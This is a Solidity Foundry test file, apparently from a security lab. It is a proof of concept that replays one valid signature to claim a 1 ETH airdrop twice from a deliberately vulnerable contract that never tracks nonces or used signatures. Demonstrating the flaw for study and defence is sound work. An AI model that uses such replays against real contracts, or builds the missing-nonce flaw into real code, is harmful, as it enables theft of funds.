// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

import {VulnerableAirdrop} from "../../src/signature-replay/VulnerableAirdrop.sol";

/// @title SignatureReplayPoC
/// @notice Proves that `VulnerableAirdrop` accepts the same valid signature
///         multiple times because it does not consume a nonce or mark signatures as used.
contract SignatureReplayPoC is Test {
    VulnerableAirdrop internal airdrop;

    uint256 internal constant TRUSTED_SIGNER_PRIVATE_KEY = 0xA11CE;
    uint256 internal constant AIRDROP_POOL = 10 ether;
    uint256 internal constant CLAIM_AMOUNT = 1 ether;

    address internal trustedSigner;
    address internal funder = makeAddr("funder");
    address internal claimant = makeAddr("claimant");

    function setUp() public {
        trustedSigner = vm.addr(TRUSTED_SIGNER_PRIVATE_KEY);
        airdrop = new VulnerableAirdrop(trustedSigner);

        vm.deal(funder, AIRDROP_POOL);
        vm.prank(funder);
        airdrop.fund{value: AIRDROP_POOL}();

        assertEq(address(airdrop).balance, AIRDROP_POOL, "airdrop should be funded");
        assertEq(claimant.balance, 0, "claimant should start with no ETH");
    }

    /// @notice PoC: one signature authorizing a 1 ETH claim can be replayed twice.
    function testExploit_SameSignatureClaimsTwice() public {
        bytes memory signature = _signClaim(claimant, CLAIM_AMOUNT);

        vm.prank(claimant);
        airdrop.claim(CLAIM_AMOUNT, signature);

        assertEq(claimant.balance, CLAIM_AMOUNT, "first claim should pay claimant");
        assertEq(address(airdrop).balance, AIRDROP_POOL - CLAIM_AMOUNT, "pool should lose first claim");

        vm.prank(claimant);
        airdrop.claim(CLAIM_AMOUNT, signature);

        assertEq(claimant.balance, CLAIM_AMOUNT * 2, "same signature should be replayable");
        assertEq(address(airdrop).balance, AIRDROP_POOL - (CLAIM_AMOUNT * 2), "pool should pay twice");
    }

    function _signClaim(address account, uint256 amount) internal view returns (bytes memory) {
        bytes32 digest = airdrop.getClaimDigest(account, amount);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(TRUSTED_SIGNER_PRIVATE_KEY, digest);

        return abi.encodePacked(r, s, v);
    }
}
